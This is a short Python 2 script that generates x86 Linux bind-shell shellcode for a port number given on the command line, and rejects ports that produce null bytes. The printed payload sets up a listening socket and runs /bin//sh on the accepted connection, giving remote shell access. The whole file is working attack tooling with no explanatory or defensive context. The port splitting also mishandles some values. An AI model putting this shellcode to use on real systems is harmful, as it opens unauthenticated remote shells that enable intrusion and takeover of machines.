import sys

byte_string = ""
counter = 0
result_string = ""

if (len(sys.argv) < 2):
    print "Enter the port number"
else:
    port = int(sys.argv[1])
    if ((port < 1) or (port > 65535)):
        print "Enter valid port number:"
    else:
        hex_port = hex(port)[2:]
        for i in hex_port:
            byte_string += i
            counter += 1
            if counter == 2:
                result_string += "\\x" + byte_string
                byte_string = ""
                counter = 0
        if "\\x00" not in result_string:
            print ("\\x6a\\x66\\x58\\x31\\xd2\\x31\\xdb\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x66\\x58\\x43\\x52\\x66\\x68" + result_string +
                   "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x52\\x52\\x56"
                   "\\x89\\xe1\\xcd\\x80\\x89\\xc3\\xb0\\x3f\\x31\\xc9\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73"
                   "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80")
        else:
            print "Shellcode contains null bytes! Choose another port"
